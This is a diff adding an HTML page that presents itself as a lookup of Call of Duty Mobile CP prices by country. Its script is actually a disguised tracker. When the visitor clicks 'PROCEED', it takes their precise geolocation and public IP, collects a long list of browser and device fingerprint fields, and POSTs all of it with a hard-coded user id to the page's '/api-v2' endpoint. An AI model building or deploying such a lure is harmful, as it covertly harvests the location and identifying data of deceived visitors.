@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>CODM country Lookup</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-icons/1.8.1/font/bootstrap-icons.min.css">
+  <style>
+    body, html {
+      font-family: 'Roboto', sans-serif;
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .container {
+      text-align: center;
+      padding: 60px;
+      background-color: rgba(255, 255, 255, 0.1);
+      border-radius: 20px;
+      backdrop-filter: blur(10px);
+      box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
+      max-width: 600px;
+    }
+    h1 {
+      font-size: 36px;
+      font-family: 'Montserrat', sans-serif;
+      margin-bottom: 30px;
+      color: #ffffff;
+      font-weight: 700;
+    }
+    button {
+      padding: 15px 30px;
+      border: none;
+      font-family: "Montserrat";
+   border-radius: 50px;
+      background-color: #ffffff;
+      color: #333;
+      cursor: pointer;
+      font-size: 18px;
+      font-weight: 500;
+      transition: all 0.3s ease;
+      margin-top: 20px;
+      display: inline-flex;
+      align-items: center;
+    }
+    button i {
+      margin-right: 8px;
+    }
+    button:hover {
+      background-color: #f8f8f8;
+      color: #0f0c29;
+      transform: scale(1.05);
+    }
+    .result {
+      margin-top: 30px;
+      font-size: 20px;
+      color: #ccc;
+      font-weight: 400;
+    }
+    footer {
+      margin-top: 50px;
+      color: #aaa;
+      font-size: 14px;
+    }
+    @keyframes rotate {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+    @keyframes fall {
+      0% { transform: translateY(-100%); opacity: 0; }
+      50% { opacity: 1; }
+      100% { transform: translateY(100vh); opacity: 0; }
+    }
+    .leaf {
+      position: absolute;
+      width: 10px;
+      height: 10px;
+      background-color: yellow;
+      border-radius: 50%;
+      animation: fall linear;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>CODM CP PRICE ?</h1>
+    <button onclick="getLocation()"><i class="bi bi-arrow-repeat"></i> PROCEED</button>
+    <p class="result" id="ipAddress"></p>
+    <p class="result" id="userLocation"></p>
+    <footer>
+      <p>check on how to buy cp in your desire country!</p>
+    </footer>
+  </div>
+  <script>
+    function rotateIcon() {
+      // Add functionality to get the IP address here
+    }
+    
+  </script>
+
+<script>
+// Coded By Devil
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition, handleError);
+  } else {
+    alert("Geolocation is not supported by this browser.");
+  }
+}
+
+function showPosition(position) {
+  const latitude = position.coords.latitude;
+  const longitude = position.coords.longitude;   
+  var originalNumber = "6185254318";
+  document.getElementById("userLocation").innerText = `Your location: Latitude ${latitude}, Longitude ${longitude}`;
+  
+  fetch('https://api.ipify.org?format=json')
+    .then(response => {
+      if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+      }
+      return response.json();
+    })
+    .then(data => {
+      const ipAddress = data.ip;
+      document.getElementById("ipAddress").innerText = `Your IP Address: ${ipAddress}`;
+     
+      const info = {
+        ip: ipAddress,
+        userid: originalNumber,
+        time: new Date().toLocaleString(),
+        location: {
+          latitude: latitude,
+          longitude: longitude
+        },
+        device: {
+          downlink: navigator.connection.downlink,
+          effectiveType: navigator.connection.effectiveType,
+          rtt: navigator.connection.rtt,
+          type: navigator.connection.type,
+          productSub: navigator.productSub,
+          vendor: navigator.vendor,
+          maxTouchPoints: navigator.maxTouchPoints,
+          doNotTrack: navigator.doNotTrack,
+          hardwareConcurrency: navigator.hardwareConcurrency,
+          cookieEnabled: navigator.cookieEnabled,
+          appCodeName: navigator.appCodeName,
+          appName: navigator.appName,
+          appVersion: navigator.appVersion,
+          platform: navigator.platform,
+          product: navigator.product,
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          languages: navigator.languages,
+          webdriver: navigator.webdriver,
+          pdfViewerEnabled: !window.Intl || typeof window.Intl.v8BreakIterator === 'function',
+          deviceMemory: navigator.deviceMemory
+        }
+      };
+      
+      return fetch('/api-v2', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(info),
+      });
+    })
+    .then(response => {
+      if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+      }
+      return response.json();
+    })
+    .then(data => {
+      console.log('Information sent successfully.');
+      console.log('Response:', data);
+    })
+    .catch(error => {
+      console.error('Error:', error);
+    });
+}
+
+function handleError(error) {
+  // Handle geolocation errors here
+  console.error('Geolocation error:', error);
+}
+</script>
+
+<script>(function(){if (!document.body) return;var js = "window['__CF$cv$params']={r:'88de1f81cf1099ed',t:'MTcxNzQwMTM0OS40MjgwMDA='};_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js',document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();</script></body>
+</html>
